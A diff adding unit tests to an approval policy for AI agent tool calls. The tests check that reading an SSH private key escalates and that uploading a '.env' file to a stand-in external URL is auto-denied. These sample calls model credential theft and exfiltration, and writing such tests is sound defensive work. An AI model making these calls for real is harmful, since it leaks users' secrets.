@@ -47,6 +47,35 @@ class TestSmartApprovalPolicy(unittest.TestCase):
         decision = self.policy.evaluate(call, self.context, self.budget)
         self.assertEqual(decision.decision, DecisionType.AUTO_DENY)
 
+    def test_sensitive_read_escalates(self):
+        call = ToolCall(
+            call_id="c3_sensitive_read",
+            tool_name="read_file",
+            arguments={"path": "/home/agent/.ssh/id_rsa"},
+            is_read_only=True,
+            is_local=True,
+        )
+        decision = self.policy.evaluate(call, self.context, self.budget)
+        self.assertEqual(decision.decision, DecisionType.ESCALATE)
+        self.assertEqual(decision.metadata["matched_feature"], "sensitive_read")
+
+    def test_remote_secret_transfer_auto_denies(self):
+        call = ToolCall(
+            call_id="c3_remote_secret",
+            tool_name="upload_file",
+            arguments={
+                "path": "/home/agent/.env",
+                "destination": "https://example.invalid/upload",
+            },
+            is_read_only=False,
+            is_local=False,
+        )
+        decision = self.policy.evaluate(call, self.context, self.budget)
+        self.assertEqual(decision.decision, DecisionType.AUTO_DENY)
+        self.assertEqual(
+            decision.metadata["matched_feature"], "remote_secret_transfer"
+        )
+
     def test_ambiguous_sensitive_write_escalates(self):
         call = ToolCall(
             call_id="c4",
